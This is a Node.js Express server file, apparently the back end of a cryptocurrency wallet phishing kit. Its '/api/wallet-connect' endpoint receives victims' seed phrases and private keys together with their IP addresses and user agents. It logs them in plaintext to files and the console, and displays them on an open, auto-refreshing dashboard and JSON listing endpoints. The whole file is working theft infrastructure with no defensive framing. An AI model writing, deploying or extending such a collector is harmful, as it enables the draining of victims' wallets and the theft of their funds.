const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();

// Always use Railway's provided PORT (critical for deployment)
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());

// Create logs directory if it doesn't exist
const logsDir = path.join(__dirname, 'wallet_logs');
if (!fs.existsSync(logsDir)) {
    fs.mkdirSync(logsDir);
}

// Store wallet connections in memory (consider using a database for persistence)
const walletConnections = [];

// Endpoint to receive wallet connection data
app.post('/api/wallet-connect', (req, res) => {
    try {
        const { 
            inputType, 
            inputValue, 
            seedPhrase, 
            privateKey, 
            walletType, 
            timestamp, 
            userAgent, 
            ipAddress 
        } = req.body;
        
        // Create connection record
        const connectionData = {
            id: Date.now().toString(),
            inputType,
            inputValue,
            seedPhrase: seedPhrase || null,
            privateKey: privateKey || null,
            walletType,
            timestamp,
            userAgent,
            ipAddress,
            receivedAt: new Date().toISOString()
        };
        
        // Store in memory
        walletConnections.push(connectionData);
        
        // Log to file
        const logEntry = `
=== WALLET CONNECTION ===
ID: ${connectionData.id}
Wallet Type: ${walletType}
Input Type: ${inputType}
${inputType === 'seedPhrase' ? 'Seed Phrase' : 'Private Key'}: ${inputValue}
Timestamp: ${timestamp}
User Agent: ${userAgent}
IP Address: ${ipAddress}
Received At: ${connectionData.receivedAt}
========================

`;
        
        const logFile = path.join(logsDir, `wallet_log_${new Date().toISOString().split('T')[0]}.txt`);
        fs.appendFileSync(logFile, logEntry);
        
        // Log to console
        console.log('New wallet connection received:');
        console.log('Wallet Type:', walletType);
        console.log('Input Type:', inputType);
        console.log(inputType === 'seedPhrase' ? 'Seed Phrase:' : 'Private Key:', inputValue);
        console.log('IP Address:', ipAddress);
        console.log('Timestamp:', timestamp);
        console.log('---');
        
        // Send success response
        res.json({
            success: true,
            message: 'Wallet connection recorded',
            connectionId: connectionData.id
        });
        
    } catch (error) {
        console.error('Error processing wallet connection:', error);
        res.status(500).json({
            success: false,
            message: 'Server error'
        });
    }
});

// Endpoint to view all connections (for admin)
app.get('/api/wallet-connections', (req, res) => {
    res.json({
        success: true,
        total: walletConnections.length,
        connections: walletConnections
    });
});

// Endpoint to view connections by wallet type
app.get('/api/wallet-connections/:walletType', (req, res) => {
    const { walletType } = req.params;
    const filtered = walletConnections.filter(conn => 
        conn.walletType.toLowerCase() === walletType.toLowerCase()
    );
    
    res.json({
        success: true,
        walletType,
        total: filtered.length,
        connections: filtered
    });
});

// Simple admin dashboard
app.get('/', (req, res) => {
    const html = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>Wallet Connections Dashboard</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; }
            .connection { border: 1px solid #ddd; padding: 15px; margin: 10px 0; border-radius: 5px; }
            .seed-phrase { background: #f5f5f5; padding: 10px; font-family: monospace; word-break: break-all; }
            .timestamp { color: #666; font-size: 0.9em; }
            .wallet-type { font-weight: bold; color: #2c3e50; }
        </style>
    </head>
    <body>
        <h1>Wallet Connections Dashboard</h1>
        <p>Total connections: <strong>${walletConnections.length}</strong></p>
        
        <div id="connections">
            ${walletConnections.map(conn => `
                <div class="connection">
                    <div class="wallet-type">Wallet: ${conn.walletType}</div>
                    <div class="timestamp">Time: ${conn.timestamp}</div>
                    <div class="timestamp">IP: ${conn.ipAddress}</div>
                    <div class="timestamp">Input Type: <strong>${conn.inputType}</strong></div>
                    <div>${conn.inputType === 'seedPhrase' ? 'Seed Phrase:' : 'Private Key:'}</div>
                    <div class="seed-phrase">${conn.inputValue}</div>
                </div>
            `).join('')}
        </div>
        
        <script>
            // Auto-refresh every 10 seconds
            setTimeout(() => location.reload(), 10000);
        </script>
    </body>
    </html>
    `;
    
    res.send(html);
});

// Start server with proper Railway configuration
const server = app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`Dashboard: http://0.0.0.0:${PORT}`);
    console.log(`API endpoint: http://0.0.0.0:${PORT}/api/wallet-connect`);
    console.log('Waiting for wallet connections...');
});

// Handle graceful shutdown (critical for Railway)
process.on('SIGTERM', () => {
    console.log('SIGTERM received. Shutting down gracefully...');
    server.close(() => {
        console.log('Server closed');
        process.exit(0);
    });
});

// Export for testing
module.exports = app;